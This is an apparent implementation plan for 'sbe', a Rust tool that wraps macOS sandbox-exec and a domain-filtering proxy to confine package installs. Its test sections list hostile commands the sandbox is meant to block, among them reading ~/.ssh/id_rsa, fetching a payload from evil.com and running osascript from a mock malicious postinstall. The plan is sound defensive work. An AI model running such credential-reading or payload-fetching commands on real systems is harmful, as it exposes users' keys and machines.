# sbe — Implementation Plan

## Phase 1: Core Sandbox (MVP)

**Goal:** `sbe run -- npm install` works with filesystem + process sandboxing, no proxy yet.

### Tasks

1. **Define `SandboxProfile` types and ecosystem defaults** (`sbe-core`)
   - `SandboxProfile` struct with all fields
   - `Ecosystem` enum with detection logic (`detect.rs`)
   - Default profiles for all 5 ecosystems (`profile/*.rs`)
   - Path expansion: `~`, `$PWD`, `$HOME`, `$JAVA_HOME` env var substitution

2. **SBPL generator** (`sbe-core::sbpl`)
   - Convert `SandboxProfile` → SBPL string
   - Handle `subpath` vs `literal` vs `regex` path types
   - Unit tests: generate SBPL for each ecosystem, validate syntax
   - Test with manual `sandbox-exec -f` invocation

3. **CLI skeleton** (`apps/cli`)
   - clap-based CLI with `run`, `inspect`, `profiles` subcommands
   - Argument parsing for all flags
   - Wire up: detect ecosystem → load profile → generate SBPL → write tempfile → exec sandbox-exec
   - Exit code passthrough
   - Integration test: `sbe run -- echo hello` succeeds, `sbe run -- cat ~/.ssh/id_rsa` fails

4. **Config file loading** (`sbe-core::config`)
   - YAML deserialization with serde
   - Config resolution: global → project → CLI merge logic
   - `extends` support for custom profiles
   - Validation: paths exist, domains are valid

### Deliverables
- `sbe run -- <cmd>` with filesystem and process sandboxing
- `sbe inspect -- <cmd>` prints SBPL
- `sbe profiles` lists defaults
- Per-project `.sbe.yaml` support

### Dependencies to Add
```toml
clap = { version = "4", features = ["derive"] }
serde_yaml = "0.9"
tempfile = "3"
dirs = "6"
```

---

## Phase 2: Network Proxy

**Goal:** Domain-level network filtering via local proxy.

### Tasks

1. **HTTP CONNECT proxy** (`sbe-proxy`)
   - Tokio-based TCP listener on ephemeral port
   - Parse HTTP CONNECT requests, extract target domain
   - Domain allowlist matching (exact + wildcard)
   - For allowed: establish upstream TCP connection, bidirectional copy (`tokio::io::copy_bidirectional`)
   - For denied: return `403 Forbidden`, log event
   - Handle plain HTTP (non-CONNECT): inspect Host header, same allow/deny logic
   - Graceful shutdown on signal

2. **Integrate proxy with executor**
   - Spawn proxy as background tokio task before sandbox
   - Pass proxy port to SBPL generator (allow only `localhost:$PORT`)
   - Inject `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY=localhost,127.0.0.1` into sandboxed env
   - On sandboxed process exit: shutdown proxy
   - Handle proxy startup failure gracefully

3. **SBPL network rules update**
   - When proxy enabled: allow `network-outbound (remote ip "localhost:*")` + mDNSResponder
   - When `--allow-all-network`: allow `network*`
   - When `--no-proxy`: allow `network-outbound (remote tcp "*:443")` (SBPL-only, no domain filtering)

4. **Integration tests**
   - Sandboxed `curl https://registry.npmjs.org` through proxy succeeds
   - Sandboxed `curl https://evil.com` through proxy fails
   - Sandboxed direct TCP to non-localhost fails (SBPL block)
   - npm install of a real package succeeds through sandbox

### Dependencies to Add
```toml
# sbe-proxy
tokio = { version = "1", features = ["net", "io-util", "rt-multi-thread", "macros", "signal"] }
tracing = "0.1"
```

---

## Phase 3: Audit & Polish

**Goal:** Production-ready with audit logging, robust error handling, documentation.

### Tasks

1. **Audit log streaming**
   - Spawn `log stream --style ndjson --predicate 'process == "sandboxd"'` as child process
   - Parse JSON events, filter by sandbox PID
   - Format and write to stderr or file
   - Summary at exit: violation counts by category

2. **Error handling polish**
   - Detect missing `sandbox-exec` binary (non-macOS)
   - Detect SIP restrictions that might affect sandboxing
   - Clear error messages for common failures
   - `--verbose` flag for debug output

3. **Documentation**
   - Man page (via clap)
   - README with quick start for each ecosystem
   - Example `.sbe.yaml` files for common project types

4. **Performance validation**
   - Benchmark sandbox startup overhead
   - Benchmark proxy throughput on large npm install
   - Profile memory usage during proxy operation

5. **Real-world validation**
   - Test against top-10 npm packages install
   - Test `cargo build` for a medium Rust project
   - Test `pip install` with native extensions (numpy, etc.)
   - Test `mix deps.get` for a Phoenix project
   - Test `gradle build` for a Spring Boot project
   - Document any ecosystem-specific quirks requiring config

### Dependencies to Add
```toml
# audit
tracing-subscriber = { version = "0.3", features = ["json"] }
```

---

## Crate Dependency Graph

```
apps/cli (sbe binary)
  ├── sbe-core (profiles, config, SBPL, detection)
  │   ├── serde + serde_yaml (config)
  │   ├── thiserror (errors)
  │   └── dirs (home dir resolution)
  ├── sbe-proxy (domain-filtering proxy)
  │   ├── tokio (async networking)
  │   └── tracing (logging)
  ├── clap (CLI args)
  ├── tempfile (SBPL tempfile)
  ├── anyhow (app errors)
  └── tracing + tracing-subscriber (logging)
```

## Testing Strategy

### Unit Tests
- SBPL generation: verify output for each ecosystem profile
- Config merging: verify precedence (builtin < global < project < CLI)
- Ecosystem detection: verify command and file-based detection
- Domain matching: exact, wildcard, edge cases
- Path expansion: `~`, env vars, relative paths

### Integration Tests
- Full `sbe run` lifecycle with simple commands
- File write blocking: attempt write to denied path, verify failure
- File read blocking: attempt read of `~/.ssh/id_rsa`, verify failure
- Network blocking: attempt outbound to non-proxy port, verify failure
- Process blocking: attempt exec of `osascript`, verify failure
- Proxy domain filtering: allowed and denied domains
- Config file loading from various locations
- Exit code passthrough for success and failure

### Manual Validation Scenarios
1. **Axios attack simulation**: Create mock malicious postinstall that attempts:
   - `curl http://evil.com:8000/payload` → blocked by proxy + SBPL
   - Write to `/Library/Caches/com.apple.act.mond` → blocked by SBPL
   - Execute `osascript` → blocked by SBPL
   - Read `~/.ssh/id_rsa` → blocked by SBPL

2. **Normal workflow validation**: Ensure zero breakage for:
   - `sbe run -- npm install` (fresh project with native deps)
   - `sbe run -- cargo build` (project with build.rs + proc macros)
   - `sbe run -- pip install numpy` (native C extension)
   - `sbe run -- mix deps.get` (hex packages)
   - `sbe run -- ./gradlew build` (gradle wrapper download + build)
